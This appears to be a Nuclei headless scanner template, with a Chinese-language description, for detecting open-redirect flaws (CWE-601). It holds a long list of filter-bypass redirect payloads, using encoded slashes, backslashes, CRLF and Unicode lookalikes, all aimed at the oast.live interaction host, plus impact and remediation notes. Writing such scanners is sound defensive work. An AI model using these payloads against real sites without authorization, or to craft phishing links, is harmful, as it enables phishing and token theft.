id: headless-open-redirect

info:
  name: 开放重定向检测（headless）
  author: theamanrawat
  severity: medium
  description: |
    开放重定向是应用在处理跳转参数或路径时未限制目标地址，导致攻击者可控制浏览器跳转到任意外部站点。本模板使用协议混淆、反斜杠、编码字符、路径变体等多组 payload 访问目标，并将跳转目标设置为 `oast.live`；页面命中 `Interactsh Server` 时，表示浏览器确实到达了外部 OAST 站点，构成有效的外部跳转证据。
  impact: |
    - 攻击者可利用受信任域名生成钓鱼链接，诱导用户进入仿冒登录页或恶意下载页面。
    - 在 OAuth、登录回调或带有令牌的跳转流程中，错误的重定向处理还可能扩大凭据泄露、令牌窃取或品牌仿冒风险。
    - 该模板确认的是跳转行为；是否能够泄露令牌或影响特定业务流程，还需要结合具体参数和认证流程进一步验证。
  remediation: |
    - 对重定向目标采用服务端白名单，优先使用站内相对路径，不要直接信任用户可控的绝对 URL。
    - 对反斜杠、编码字符、协议相对 URL 和多重解析结果进行统一规范化后再校验，并避免在跳转前拼接未验证输入。
    - 修复后复测登录、退出、OAuth 回调和错误页面等所有跳转入口。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-601
  tags: redirect,generic,headless,vuln

headless:
  - steps:
      - args:
          url: '{{BaseURL}}/{{redirect}}'
        action: navigate

      - action: waitload
    payloads:
      redirect:
        - '%09/oast.live/'
        - '%5C%5Coast.live/%252e%252e%252f'
        - '%5Coast.live'
        - '%5coast.live/%2f%2e%2e'
        - '%5c{{RootURL}}oast.live/%2f%2e%2e'
        - '../oast.live'
        - '.oast.live'
        - '/%5coast.live'
        - '////\;@oast.live'
        - '////oast.live'
        - '///oast.live'
        - '///oast.live/%2f%2e%2e'
        - '///oast.live@//'
        - '///{{RootURL}}oast.live/%2f%2e%2e'
        - '//;@oast.live'
        - '//\/oast.live/'
        - '//\@oast.live'
        - '//\oast.live'
        - '//\toast.live/'
        - '//oast.live/%2F..'
        - '//oast.live//'
        - '//%69%6e%74%65%72%61%63%74%2e%73%68'
        - '//oast.live@//'
        - '//oast.live\toast.live/'
        - '//https://oast.live@//'
        - '/<>//oast.live'
        - '/\/\/oast.live/'
        - '/\/oast.live'
        - '/\oast.live'
        - '/oast.live'
        - '/oast.live/%2F..'
        - '/oast.live/'
        - '/oast.live/..;/css'
        - '/https:oast.live'
        - '/{{RootURL}}oast.live/'
        - '/〱oast.live'
        - '/〵oast.live'
        - '/ゝoast.live'
        - '/ーoast.live'
        - '/ｰoast.live'
        - '<>//oast.live'
        - '@oast.live'
        - '@https://oast.live'
        - '\/\/oast.live/'
        - 'oast%E3%80%82live'
        - 'oast.live'
        - 'oast.live/'
        - 'oast.live//'
        - 'oast.live;@'
        - 'https%3a%2f%2foast.live%2f'
        - 'https:%0a%0doast.live'
        - 'https://%0a%0doast.live'
        - 'https://%09/oast.live'
        - 'https://%2f%2f.oast.live/'
        - 'https://%3F.oast.live/'
        - 'https://%5c%5c.oast.live/'
        - 'https://%5coast.live@'
        - 'https://%23.oast.live/'
        - 'https://.oast.live'
        - 'https://////oast.live'
        - 'https:///oast.live'
        - 'https:///oast.live/%2e%2e'
        - 'https:///oast.live/%2f%2e%2e'
        - 'https:///oast.live@oast.live/%2e%2e'
        - 'https:///oast.live@oast.live/%2f%2e%2e'
        - 'https://:80#@oast.live/'
        - 'https://:80?@oast.live/'
        - 'https://:@\@oast.live'
        - 'https://:@oast.live\@oast.live'
        - 'https://;@oast.live'
        - 'https://\toast.live/'
        - 'https://oast.live/oast.live'
        - 'https://oast.live/https://oast.live/'
        - 'https://www.\.oast.live'
        - 'https:/\/\oast.live'
        - 'https:/\oast.live'
        - 'https:/oast.live'
        - 'https:oast.live'
        - '{{RootURL}}oast.live'
        - '〱oast.live'
        - '〵oast.live'
        - 'ゝoast.live'
        - 'ーoast.live'
        - 'ｰoast.live'
        - 'redirect/oast.live'
        - 'cgi-bin/redirect.cgi?oast.live'
        - 'out?oast.live'
        - 'login?to=http://oast.live'
        - '#/oast.live'
        - '%0a/oast.live/'
        - '%0d/oast.live/'
        - '%00/oast.live/'
    stop-at-first-match: true
    matchers:
      - type: word
        part: body
        words:
          - "Interactsh Server"
